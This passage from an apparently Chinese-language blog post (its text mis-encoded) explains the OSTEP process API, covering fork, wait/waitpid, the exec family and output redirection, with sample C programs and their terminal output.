(ppid:%d)---%p\n&quot;</span>, (<span class="type">int</span>) getpid(),(<span class="type">int</span>)getppid(),&amp;x);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (pid:%d)---%p\n&quot;</span>,</span><br><span class="line">           rc, (<span class="type">int</span>) getpid(),&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5116</span>)</span></span><br><span class="line">hello, I am parent of 5117 <span class="params">(pid:<span class="number">5116</span>)</span>---0x7ffd842ab520</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5117</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">1</span>)</span>---0x7ffd842ab520</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5164</span>)</span></span><br><span class="line">hello, I am parent of 5165 <span class="params">(pid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5165</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br></pre></td></tr></table></figure><p>man 2 fork</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨fork()çš„è¿›ç¨‹è¢«ç§°ä¸ºçˆ¶è¿›ç¨‹ï¼Œfork()ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä¸ä¼šä» main()å‡½æ•°å¼€å§‹æ‰§è¡Œï¼Œè€Œæ˜¯ç›´æ¥ä» fork()ç³»ç»Ÿè°ƒç”¨è¿”å›</p><p>å­è¿›ç¨‹å¾—åˆ°ä¸çˆ¶è¿›ç¨‹ç”¨æˆ·çº§è™šæ‹Ÿåœ°å€ç©ºé—´ç›¸åŒçš„ï¼ˆä½†æ˜¯ç‹¬ç«‹çš„ï¼‰ä¸€ä»½å‰¯æœ¬ï¼ŒåŒ…æ‹¬ä»£ç å’Œæ•°æ®æ®µã€å †ã€å…±äº«åº“ä»¥åŠç”¨æˆ·æ ˆã€‚å­è¿›ç¨‹è¿˜è·å¾—ä¸çˆ¶è¿›ç¨‹ä»»ä½•æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ç›¸åŒçš„å‰¯æœ¬ï¼Œè¿™å°±æ„å‘³ç€å½“çˆ¶è¿›ç¨‹è°ƒç”¨forkæ—¶ï¼Œå­è¿›ç¨‹å¯ä»¥è¯»å†™çˆ¶è¿›ç¨‹ä¸­æ‰“å¼€çš„ä»»ä½•æ–‡ä»¶ã€‚çˆ¶è¿›ç¨‹å’Œæ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¹‹é—´æœ€å¤§çš„åŒºåˆ«åœ¨äºå®ƒä»¬æœ‰ä¸åŒçš„PIDã€‚</p><p>forkçš„å®è´¨å°±æ˜¯å¾—åˆ°çˆ¶è¿›ç¨‹åœ¨å†…æ ¸é‡Œæè¿°è¿›ç¨‹ä¿¡æ¯çš„æ•°æ®ç»“æ„çš„å‰¯æœ¬ï¼Œç„¶åç»™ä¸€ä¸ªæ–°çš„pid</p><p>forkçš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹é‡‡ç”¨äº†ä¸€ç§å«åšå†™æ—¶å¤åˆ¶(copy-on-write )çš„æŠ€æœ¯ï¼Œå­è¿›ç¨‹ç›´æ¥å¤åˆ¶äº†é¡µè¡¨ï¼Œä»–ä»¬åˆšå¼€å§‹æ˜ å°„åˆ°äº†åŒä¸€å—ç‰©ç†å†…å­˜ï¼Œåˆšå¼€å§‹ç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€çˆ¶å­éƒ½ç›¸åŒï¼Œä»»ä½•ä¸€ä¸ªè¿›ç¨‹è¦å¯¹å…±äº«çš„é¡µé¢â€œå†™æ“ä½œâ€ï¼Œå†…æ ¸ä¼šå¤åˆ¶ä¸€ä¸ªç‰©ç†é¡µé¢ç»™è¿™ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼ŒåŒæ—¶ä¿®æ”¹é¡µè¡¨æ˜ å°„ï¼Œcopy on writeåŒæ ·å­˜åœ¨äºè¿›ç¨‹ä¹‹é—´å…±äº«å†…å­˜çš„åœºæ™¯</p><p>å¯¹äºå®é™…å®ç°ä¸Šå¯èƒ½ä¼šæŠŠåŸæ¥å¯å†™é¡µé¢æ ‡è®°ä¸ºåªè¯»ï¼Œå¹¶æŠŠé¡µé¢å¼•ç”¨è®¡æ•°åŠ ä¸€ï¼Œå½“æœ‰è¿›ç¨‹å†™å…¥æ—¶ä¼šè§¦å‘å¼‚å¸¸ï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®å¼•ç”¨è®¡æ•°æ¥ç¡®å®šæ˜¯COWï¼Œå¤åˆ¶ä¸€ä»½å†™å…¥ï¼Œå¹¶æŠŠé¡µé¢å¼•ç”¨è®¡æ•°å‡ä¸€</p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411222658013.png" alt="image-20230411222658013" style="zoom:67%;"><p>RETURN VALUE<br>On success, the PID of the child process is returned in the parent, and<br>0  is returned in the child.  On failure, -1 is returned in the parent,<br>no child process is created, and errno is set appropriately.</p><p>é€šè¿‡è¿”å›å€¼å¯ä»¥è¿›è¡Œä¸åŒå¤„ç†</p><p>æœ‰è¶£çš„æ—¶æˆ‘ä»¬ä¸Šé¢ä¸¤æ¬¡ç»“æœçš„ppidæ˜¯ä¸åŒçš„ï¼Œè¿™æ˜¯å› ä¸ºCPUè°ƒåº¦ç¨‹åºï¼ˆschedulerï¼‰å†³å®šäº†æŸä¸ªæ—¶åˆ»å“ªä¸ªè¿›ç¨‹è¢«æ‰§è¡Œï¼Œä¾‹å¦‚ä¸Šä¸€ç« çš„IO</p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411223805891.png" alt="image-20230411223805891"></p><p>è¿›ç¨‹1ï¼ˆinitè¿›ç¨‹ï¼‰æ²¡æœ‰çˆ¶è¿›ç¨‹,æ˜¯æ‰€æœ‰è¿›ç¨‹çš„ç¥–å…ˆè¿›ç¨‹,å¦‚æœå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹åœ¨å­è¿›ç¨‹ç»“æŸä¹‹å‰ç»ˆæ­¢äº†ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹IDå°±ä¼šå˜ä¸º1ï¼Œå³initè¿›ç¨‹çš„PIDã€‚</p></blockquote><h3 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h3><p>man 2 wait</p><p>è¿›ç¨‹ç»“æŸå,å†…æ ¸å¹¶ä¸æ˜¯ç«‹å³æŠŠå®ƒä»ç³»ç»Ÿä¸­æ¸…é™¤,è¢«ä¿æŒåœ¨ä¸€ç§å·²ç»ˆæ­¢çš„çŠ¶æ€ä¸­ï¼Œç›´åˆ°è¢«å®ƒçš„çˆ¶è¿›ç¨‹å›æ”¶(reaped)ã€‚è¢«å«åšåƒµæ­»è¿›ç¨‹ï¼Œå¦‚æœçˆ¶è¿›ç¨‹å…ˆç»“æŸäº†ï¼Œè™½ç„¶initè¿›ç¨‹ä¼šç»§æ‰¿ä»–ä»¬å¹¶å›æ”¶ï¼Œæˆ‘ä»¬æœ€å¥½è¿˜æ˜¯è®©çˆ¶è¿›ç¨‹å»åš</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid,<span class="type">int</span> *stateusp,<span class="type">int</span> options=<span class="number">0</span>)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¦‚æœåœ¨è°ƒç”¨waitpid()å‡½æ•°æ—¶ï¼Œå½“æŒ‡å®šç­‰å¾…çš„å­è¿›ç¨‹å·²ç»åœæ­¢è¿è¡Œæˆ–ç»“æŸäº†ï¼Œåˆ™waitpid()ä¼šç«‹å³è¿”å›ï¼›ä½†æ˜¯å¦‚æœå­è¿›ç¨‹è¿˜æ²¡æœ‰åœæ­¢è¿è¡Œæˆ–ç»“æŸï¼Œåˆ™è°ƒç”¨waitpid()å‡½æ•°çš„çˆ¶è¿›ç¨‹åˆ™ä¼šè¢«é˜»å¡ï¼Œæš‚åœè¿è¡Œã€‚</span></span><br><span class="line"><span class="comment">è¿”å›ï¼šå¦‚æœæˆåŠŸï¼Œåˆ™ä¸ºå­è¿›ç¨‹çš„ PID, å¦‚æœ option WNOHANG, åˆ™ä¸º 0, å¦‚æœå…¶ä»–é”™è¯¯ï¼Œåˆ™ä¸ºâ€” 1,</span></span><br><span class="line"><span class="comment">arg1    pid&gt;0 ç­‰å¾…é›†åˆæ˜¯ä¸€ä¸ªå•ç‹¬çš„å­è¿›ç¨‹ id=pid</span></span><br><span class="line"><span class="comment">        pid =0 ç­‰å¾…è¿›ç¨‹ç»„å·ä¸ç›®å‰è¿›ç¨‹ç›¸åŒçš„ä»»ä½•è¿›ç¨‹</span></span><br><span class="line"><span class="comment">        pid=-1 ç­‰å¾…é›†åˆå°±æ˜¯ç”±çˆ¶è¿›ç¨‹æ‰€æœ‰çš„å­è¿›ç¨‹ç»„æˆçš„</span></span><br><span class="line"><span class="comment">        pid&lt; -1ç­‰å¾…è¿›ç¨‹ç»„å·ä¸ºpidç»å¯¹å€¼çš„ä»»ä½•å­è¿›ç¨‹</span></span><br><span class="line"><span class="comment">arg2    æ”¾ä¸Šå…³äºå¯¼è‡´è¿”å›çš„å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼Œwait.hå¤´æ–‡ä»¶å®šä¹‰äº†è¿”å›å®</span></span><br><span class="line"><span class="comment">arg3    â€¢ WNOHANG: éé˜»å¡ç­‰å¾…è¿›ç¨‹ï¼Œå¦‚æœç­‰å¾…é›†åˆä¸­çš„ä»»ä½•å­è¿›ç¨‹éƒ½è¿˜æ²¡æœ‰ç»ˆæ­¢ï¼Œé‚£ä¹ˆå°±ç«‹å³è¿”å›ï¼ˆè¿”å›å€¼ä¸º 0)ã€‚å¦‚æœæœ‰å­è¿›ç¨‹é€€å‡ºäº†ï¼Œçˆ¶è¿›ç¨‹è°ƒç”¨waitpidå‡½æ•°è¿”å›å­è¿›ç¨‹çš„PIDï¼Œåœ¨ç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢çš„åŒæ—¶ï¼Œå¦‚æœè¿˜æƒ³åšäº›æœ‰ç”¨çš„ä¸ä½œï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæœ‰ç”¨ã€‚</span></span><br><span class="line"><span class="comment">        â€¢ WUNTRACED: æŒ‚èµ·è°ƒç”¨è¿›ç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°ç­‰å¾…é›†åˆä¸­çš„ä¸€ä¸ªè¿›ç¨‹å˜æˆå·³ç»ˆæ­¢æˆ–è€…è¢«åœæ­¢ã€‚è¿”å›çš„ PID ä¸ºå¯¼è‡´è¿”å›çš„å·³ç»ˆæ­¢æˆ–è¢«åœæ­¢å­è¿›ç¨‹çš„ PID ã€‚ é»˜è®¤çš„è¡Œä¸ºæ˜¯åªè¿”å›å·±ç»ˆæ­¢çš„å­è¿›ç¨‹ã€‚å½“ä½ æƒ³è¦æ£€æŸ¥å·±ç»ˆæ­¢å’Œè¢«åœæ­¢çš„å­è¿›ç¨‹æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæœ‰ç”¨ã€‚</span></span><br><span class="line"><span class="comment">        â€¢ WCONTINUED: æŒ‚èµ·è°ƒç”¨è¿›ç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°ç­‰å¾…é›†åˆä¸­ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ç»ˆæ­¢æˆ–ç­‰å¾…é›†åˆä¸­ä¸€ä¸ªè¢«åœæ­¢çš„è¿›ç¨‹æ”¶åˆ° SIGCONT ä¿¡å·é‡æ–°å¼€å§‹æ‰§è¡Œã€‚ </span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *statusp)</span>;</span><br><span class="line">waitpidçš„ç®€å•ç‰ˆæœ¬ ç›¸å½“äºwaitpid(- <span class="number">1</span>,*statusp, <span class="number">0</span>)</span><br><span class="line">è¿”å›ï¼šå¦‚æœæˆåŠŸï¼Œåˆ™ä¸ºå­è¿›ç¨‹çš„ PID, å¦‚æœå‡ºé”™ï¼Œåˆ™ä¸º <span class="number">-1</span> ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (wc:%d) (pid:%d)\n&quot;</span>,</span><br><span class="line">           rc, wc, (<span class="type">int</span>) getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p2</span><br><span class="line">hello world (pid:5404)</span><br><span class="line">hello, I am child (pid:5405)</span><br><span class="line">hello, I am parent of 5405 (wc:5405) (pid:5404)</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªè¿›ç¨‹è¿è¡Œå…ˆåé¡ºåºè¿˜æ˜¯å–å†³äºcpuè°ƒåº¦</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>man 3 exec</p><p>exec å‡½æ•°æ—</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">          <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/*, (char *) NULL, char *const envp[] */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span><br><span class="line"><span class="params">            <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>åªæœ‰execveæ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶å®ƒéƒ½æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šç»è¿‡åŒ…è£…çš„åº“å‡½æ•°ï¼Œå‡½æ•°åŠŸèƒ½å¤§åŒå°å¼‚å°±æ˜¯è°ƒç”¨åŠ è½½å™¨æ ¹æ®è¦åŠ è½½çš„ELFå¤´è¡¨é‡Œçš„ä¿¡æ¯è¦†å†™è°ƒç”¨ç¨‹åº<br>çš„ä»£ç æ®µï¼ˆä»¥åŠé™æ€æ•°æ®ï¼‰ï¼Œå †ã€æ ˆåŠå…¶ä»–å†…å­˜ç©ºé—´ä¹Ÿä¼šè¢«é‡æ–°åˆå§‹åŒ–ï¼Œå¹¶æŠŠå‚æ•°ä¼ é€’ï¼Œè¯¥å‡½æ•°è°ƒç”¨æˆåŠŸä¸ä¼šè¿”å›</p><p>execveå®é™…ä¸Šä¹Ÿä¸ä¼šæŠŠç£ç›˜é‡Œçš„ç¨‹åºæ‹·è´åˆ°ç‰©ç†å†…å­˜ï¼Œè€Œæ˜¯æŠŠè¿›ç¨‹çš„é¡µè¡¨æ˜ å°„åˆ°ç£ç›˜ä¸Šï¼Œè§¦å‘ç¼ºé¡µåç”±å¤„ç†ç¨‹åºå†åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¾›cpu ä½¿ç”¨</p><p>è¢«ç»§æ‰¿</p><ul><li>æ–‡ä»¶æè¿°ç¬¦</li><li>ä¿¡å·å¤„ç†ç¨‹åº</li><li>ç”¨æˆ·å’Œç»„ ID</li><li>ç¯å¢ƒå˜é‡</li><li>ä¿¡å·å±è”½å­—</li></ul><p>å½“å‰è¿›ç¨‹ä¸­çš„ä»»ä½•çº¿ç¨‹æˆ–é”ä¸ä¼šè¢«ç»§æ‰¿ï¼Œåœ¨æ–°ç¨‹åºä¸­ï¼Œä¸ä¼šæœ‰ä»»ä½•çˆ¶è¿›ç¨‹ä¸­çš„å±€éƒ¨å˜é‡ã€æ ˆå’Œå †ç­‰å†…å­˜ä¿¡æ¯ã€‚</p><p><code>int execve(const char *pathname, char *const argv[], char *const envp[])</code></p><ul><li>filenameï¼šæŒ‡å‘å¯æ‰§è¡Œæ–‡ä»¶åçš„ç”¨æˆ·ç©ºé—´æŒ‡é’ˆã€‚</li><li>argvï¼šå‚æ•°åˆ—è¡¨ï¼ŒæŒ‡å‘ç”¨æˆ·ç©ºé—´çš„å‚æ•°åˆ—è¡¨èµ·å§‹åœ°å€ </li><li>envpï¼šç¯å¢ƒå˜é‡è¡¨ï¼Œç¯å¢ƒå˜é‡æ˜¯ä¸€ç³»åˆ—é”®å€¼å¯¹ï¼Œå­—ç¬¦ä¸²ç±»å‹</li><li>argv envpæ•°ç»„ä»¥nullç»“å°¾</li></ul><p><code>int main (int argc, char *argv [], char *envp [])</code></p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230420112311806.png" alt="image-20230420112311806"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* myecho.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[],<span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; argc; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, j, argv[j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; envp[i]; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* execve.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">    <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[] = &#123; <span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *newenviron[] = &#123; <span class="string">&quot;grxer=666&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-to-exec&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newargv[<span class="number">0</span>] = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    execve(argv[<span class="number">1</span>], newargv, newenviron);</span><br><span class="line">    perror(<span class="string">&quot;execve&quot;</span>);   <span class="comment">/* execve() returns only on error */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/test&gt; gcc  -g -o myecho myecho.c &amp;&amp; gcc -g -o execve execve.c</span><br><span class="line">grxer@grxer ~/D/s/test&gt; ./execve ./myecho</span><br><span class="line">argv[0]: ./myecho</span><br><span class="line">argv[1]: hello</span><br><span class="line">argv[2]: world</span><br><span class="line">grxer=666</span><br><span class="line">./myecho</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id="ç”¨å¥‡æ€ªçš„çº¦å®šåšä¸€äº›ç¥å¥‡çš„äº‹æƒ…"><a href="#ç”¨å¥‡æ€ªçš„çº¦å®šåšä¸€äº›ç¥å¥‡çš„äº‹æƒ…" class="headerlink" title="ç”¨å¥‡æ€ªçš„çº¦å®šåšä¸€äº›ç¥å¥‡çš„äº‹æƒ…"></a>ç”¨å¥‡æ€ªçš„çº¦å®šåšä¸€äº›ç¥å¥‡çš„äº‹æƒ…</h3><p>forkå’Œexevçœ‹èµ·æ¥æ˜¯éå¸¸å¥‡æ€ªçš„ï¼Œä¸ºä»€ä¹ˆè¦æŠŠä¸¤ä¸ªæ“ä½œåˆ†å¼€å»åˆ›å»ºæ–°è¿›ç¨‹ï¼Œè€Œä¸æ˜¯æ•´åˆæˆä¸€ä¸ªapiï¼Œå…¶å®è¿™ç»™äº†shell åœ¨fork ä¹‹å exec ä¹‹å‰è¿è¡Œä»£ç çš„æœºä¼šï¼Œæ¥å®ç°ä¸€äº›å¾ˆæœ‰è¶£çš„äº‹</p><p>æ¯”å¦‚è¯´æˆ‘ä»¬çš„è¾“å‡ºé‡å®šå‘</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// child: redirect standard output to a file</span></span><br><span class="line">    close(STDOUT_FILENO); </span><br><span class="line">    open(<span class="string">&quot;./p4.output&quot;</span>, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now exec &quot;wc&quot;...</span></span><br><span class="line">        <span class="type">char</span> *myargs[<span class="number">3</span>];</span><br><span class="line">        myargs[<span class="number">0</span>] = strdup(<span class="string">&quot;wc&quot;</span>);   <span class="comment">// program: &quot;wc&quot; (word count)</span></span><br><span class="line">        myargs[<span class="number">1</span>] = strdup(<span class="string">&quot;p4.c&quot;</span>); <span class="comment">// argument: file to count</span></span><br><span class="line">        myargs[<span class="number">2</span>] = <span class="literal">NULL</span>;           <span class="comment">// marks end of array</span></span><br><span class="line">        execvp(myargs[<span class="number">0</span>], myargs);  <span class="comment">// runs word count</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">    assert(wc &gt;= <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; cat ./p4.output </span><br><span class="line"> <span class="number">34</span> <span class="number">114</span> <span class="number">918</span> p4.c</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæŠŠè¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶</p><p>åŸç†ï¼š</p><p>forkåå­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹é»˜è®¤æ‰“å¼€çš„æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡º0ã€1 å’Œ 2 